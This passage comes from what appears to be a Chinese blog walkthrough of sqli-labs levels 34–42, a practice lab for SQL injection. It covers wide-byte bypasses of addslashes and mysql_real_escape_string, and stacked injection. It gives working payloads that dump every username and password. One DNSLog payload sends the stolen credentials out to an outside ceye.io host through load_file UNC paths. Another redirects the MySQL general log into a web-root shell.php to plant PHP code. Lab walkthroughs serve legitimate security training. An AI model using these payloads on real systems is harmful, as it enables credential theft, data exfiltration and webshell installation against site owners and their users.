<span class="token operator">|</span> <span class="token number">11</span> <span class="token operator">|</span> admin3        <span class="token operator">|</span> admin3     <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> dhakkan       <span class="token operator">|</span> dumbo      <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">14</span> <span class="token operator">|</span> admin4        <span class="token operator">|</span> admin4     <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">21</span> <span class="token operator">|</span> admin<span class="token string">'#hacker | 111        |
+----+---------------+------------+
14 rows in set (0.00 sec)

# where username = '</span>x<span class="token string">' or 0
mysql> select * from users where username = '</span>x<span class="token string">' or 0;
Empty set (0.00 sec)

# where 1
mysql> select * from users where 1;
+----+---------------+------------+
| id | username      | password   |
+----+---------------+------------+
|  1 | Dumb          | Dumb       |
|  2 | Angelina      | I-kill-you |
|  3 | Dummy         | p@ssword   |
|  4 | secure        | crappy     |
|  5 | stupid        | stupidity  |
|  6 | superman      | genious    |
|  7 | batman        | mob!le     |
|  8 | admin         | 233        |
|  9 | admin1        | admin1     |
| 10 | admin2        | admin2     |
| 11 | admin3        | admin3     |
| 12 | dhakkan       | dumbo      |
| 14 | admin4        | admin4     |
| 21 | admin'</span><span class="token comment">#hacker | 111        |</span>
+----+---------------+------------+
<span class="token number">14</span> rows <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

<span class="token comment"># where 0</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where <span class="token number">0</span><span class="token punctuation">;</span>
Empty <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么直接尝试一下最基本的联合查询注入看看：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;�&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也是 OK 的</p>
<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=$id</code></td>
</tr>
</tbody></table>
<p>Less-35 的防护措施有点搞笑，首先 id 使用了如下规则过滤：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是本关的拼接方式是：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p>主要防护代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">check_quotes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">check_quotes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$string</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符：</p>
<table>
<thead>
<tr>
<th align="left">危险字符</th>
<th align="left">转义后</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>\</code></td>
<td align="left"><code>\\</code></td>
</tr>
<tr>
<td align="left"><code>&#39;</code></td>
<td align="left"><code>\&#39;</code></td>
</tr>
<tr>
<td align="left"><code>&quot;</code></td>
<td align="left"><code>\&quot;</code></td>
</tr>
</tbody></table>
<p>这一关使用 Less-34 关的两种思路依然是可行的，下面直接尝试 payload 进行注入吧：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1�&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>username=&#39;$uname&#39;</code></td>
</tr>
</tbody></table>
<p>依然使用了 和 Less-36 的防护方法：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$uname1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$passwd</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$passwd1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>所以利用思路也是一毛一样的，只是由 GET 型变成了 POST 型了，下面就直接尝试注入吧：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;%df&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;�&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="堆叠注入-38-53-关"><a href="#堆叠注入-38-53-关" class="headerlink" title="堆叠注入 38-53 关"></a>堆叠注入 38-53 关</h1><h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>MySQL 的命令行中，每一条语句以<code>;</code>结尾，这代表语句的结束，如果在注入过程中在<code>;</code>后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where <span class="token function">id</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+----+----------+----------+
<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
+----+----------+----------+
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb     <span class="token operator">|</span>
+----+----------+----------+
<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

+-------------------------+
<span class="token operator">|</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token operator">|</span>
+-------------------------+
<span class="token operator">|</span> <span class="token number">5.5</span>.44-0ubuntu0.14.04.1 <span class="token operator">|</span>
+-------------------------+
<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。</p>
<h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><ol>
<li>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。</li>
<li>在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略</li>
</ol>
<p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等</p>
<h3 id="各个数据库堆叠查询实例"><a href="#各个数据库堆叠查询实例" class="headerlink" title="各个数据库堆叠查询实例"></a>各个数据库堆叠查询实例</h3><p><strong>MySQL</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQL Server</strong></p>
<pre class="line-numbers language-mssql" data-language="mssql"><code class="language-mssql">select 1,2,3;select * from test;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>Postgresql</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_test<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注入天书里面说 Oracle 不支持堆叠查询，这个 我对 Oracle 不熟悉，以后接触到了 再亲自尝试看看。</p>
<h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注、堆叠注入</td>
<td align="left"><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p>又到了简单源码分析的时间了，来看看堆叠注入的代码是如何实现的：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># id 参数直接带入到 SQL 语句中</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    输出查询信息
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现和之前的关卡区别不大，唯一的区别就是查询 SQL 语句由原来的：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>变成了现在的：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p>
<p>既然知道原理了 那么这一关就详细演示一下这个堆叠注入如何灵活使用：</p>
<p><strong>添加字段值</strong></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;;insert into users(username,password) values (&#39;hello&#39;,&#39;world&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>数据库中查看是否添加成功：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where username <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>
+----+----------+----------+
<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
+----+----------+----------+
<span class="token operator">|</span> <span class="token number">23</span> <span class="token operator">|</span> hello    <span class="token operator">|</span> world    <span class="token operator">|</span>
+----+----------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是这个貌似并没有什么作用，但是注入天书里面也没有说其他的姿势，实际上看到这里的人应该明白后面是可以执行任意 SQL 语句的，那么这个怎么进行漏洞利用的话 就完全看你的想象力了，接下来 演示我认为比较实用的姿势。</p>
<h3 id="DNSLog-数据外带"><a href="#DNSLog-数据外带" class="headerlink" title="DNSLog 数据外带"></a>DNSLog 数据外带</h3><p>需要条件：</p>
<ol>
<li>MySQL 开启 load_file()</li>
<li>DNSLog 平台 （<a target="_blank" rel="noopener" href="http://hyuga.co/">Hyuga</a>、<a target="_blank" rel="noopener" href="http://ceye.io/">CEYE</a>）</li>
<li>Windows 平台</li>
</ol>
<p>load_file 函数在 Linux 下是无法用来做 DNSLog 攻击的，因为在这里就涉及到 Windows 的 UNC 路径。</p>
<p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p>
<pre class="line-numbers language-none"><code class="language-none">\\192.168.31.53\test\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>CONCAT()</code> 函数拼接了4个<code>\</code>了，因为转义的原因，4个就变<code>\</code>成了2个<code>\</code>，目的就是利用 UNC 路径。</p>
<p>因为 Linux 没有 UNC 路径这个东西，所以当 MySQL 处于 Linux 系统中的时候，是不能使用这种方式外带数据的。</p>
<p>下面 临时使用 Windows 下的 PHPStudy 来搭建 sqli-labs 测试环境：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;;select load_file(concat(&#39;\\\\&#39;,(select hex(concat_ws(&#39;~&#39;,username,password)) from users limit 0,1),&#39;.gvc791.ceye.io\\abc&#39;))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Hex 编码的目的就是减少干扰，因为域名是有一定的规范，有些特殊符号是不能带入的有。</p>
<p><img src="https://image.3001.net/images/20200517/15897015756622.png" alt="img"></p>
<p>手动 Hex 解码即可</p>
<h3 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h3><p>需要条件：</p>
<ol>
<li>Web 的物理路径</li>
<li>MySQL 可以读写 Web 目录</li>
<li>Windows 成功率 高于 Linux</li>
</ol>
<p>首先查看当前的日志的相关配置：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> SHOW VARIABLES LIKE <span class="token string">'general%'</span><span class="token punctuation">;</span>
+------------------+---------------------------------+
<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> Value                           <span class="token operator">|</span>
+------------------+---------------------------------+
<span class="token operator">|</span> general_log      <span class="token operator">|</span> OFF                             <span class="token operator">|</span>
<span class="token operator">|</span> general_log_file <span class="token operator">|</span> /var/lib/mysql/bb198f1a9cc6.log <span class="token operator">|</span>
+------------------+---------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Docker 里面的这个 Ubuntu 环境默认是没有开启的，这里尝试注入的时候手动开启：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;;set global general_log &#x3D; &quot;ON&quot;;set global general_log_file&#x3D;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后 MySQL 再查看日志配置是否被修改了：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> SHOW VARIABLES LIKE <span class="token string">'general%'</span><span class="token punctuation">;</span>
+------------------+-------------------------+
<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> Value                   <span class="token operator">|</span>
+------------------+-------------------------+
<span class="token operator">|</span> general_log      <span class="token operator">|</span> ON                      <span class="token operator">|</span>
<span class="token operator">|</span> general_log_file <span class="token operator">|</span> /var/www/html/shell.php <span class="token operator">|</span>
+------------------+-------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个尝试 getshell：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>日志里面就会记录<code>&lt;?php phpinfo();?&gt;</code>，浏览器访问查看：</p>
<p>查看一下当的日志文件：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$ cat <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>shell<span class="token punctuation">.</span>php
<span class="token number">200517</span>  <span class="token number">8</span>:<span class="token number">47</span>:<span class="token number">04</span>       <span class="token number">10</span> <span class="token keyword">Connect</span>    root<span class="token variable">@localhost</span> <span class="token keyword">on</span> security
           <span class="token number">10</span> Init DB    security
           <span class="token number">10</span> Query    <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo();?>'</span><span class="token comment">-- ' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时已经成功写入了，但是因为这个文件属于 mysql 用户组的， 我测试并没有成功执行：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ls</span> -l  /var/www/html/shell.php
-rw-rw---- <span class="token number">1</span> mysql mysql <span class="token number">171</span> May <span class="token number">17</span> 08:47 /var/www/html/shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>不过在 Windows 下 phpstudy 测试是可以很成功的 getshell 的，如果有师傅补充的话 欢迎评论区留言！</p>
<h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注、堆叠注入</td>
<td align="left"><code>id=$id</code></td>
</tr>
</tbody></table>
<p>和 Less-38 相比没有啥区别，只是拼接方式不一样。</p>
<h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注、堆叠注入</td>
<td align="left"><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody></table>
<p>和 Less-38 相比只是拼接方式不一样。</p>
<p>但是看了这一关源码下面还有其他文件，类似于 Less-24 的二次注入，看了下源码貌似和 Less-24 是一样的，可能是作者的疏忽吧，忘记删掉这些不相干的文件了。</p>
<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、布尔盲注、延时盲注、堆叠注入</td>
<td align="left"><code>id=$id</code></td>
</tr>
</tbody></table>
<p>和 Less-39 类似，因为少了报错输出，所以这里不能报错注入，其他注入方式一样， 这里不再赘述。</p>
<h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">联合、报错、布尔盲注、延时盲注、堆叠注入</td>
<td align="left"><code>username=&#39;$username&#39;</code></td>
</tr>
</tbody></table>
<ul>
<li><code>index.php</code></li>
</ul>
<p>没有啥核心代码，PHP 和 HTML 混写，只要写了登录的表单，并提供了忘记密码和创建用户的链接，相比于 Less-24 的二次注入，这两个链接都不能直接访问，无法直接创建用户。</p>
<ul>
<li><code>forgot_password.php</code></li>
</ul>
<p>if you forgot your password,go to hack it</p>
<ul>
<li><code>acc-create.php</code></li>
</ul>
<p>if you need to create account,then hack your way in</p>
<ul>
<li><code>failed.php</code></li>
</ul>
<p>Bug off you silly dump hacker</p>
<ul>
<li><code>login.php</code></li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># username 被过滤 ' " \ password 没有被</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment"># 堆叠查询</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span>
<span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> 查询成功：
    <span class="token keyword">return</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> 登录成功<span class="token punctuation">:</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Auth"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    跳转到 logged<span class="token operator">-</span>in<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><code>logged-in.php</code></li>
</ul>
<p>登录成功，提供修改密码的表单</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mylogin<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pass_change.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><code>pass_change.php</code></li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> 没有登录<span class="token punctuation">:</span>
    重定向到 index<span class="token operator">.</span>php

<span class="token keyword">if</span> 提交了修改密码表单<span class="token punctuation">:</span>
    <span class="token variable">$username</span><span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$curr_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'current_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
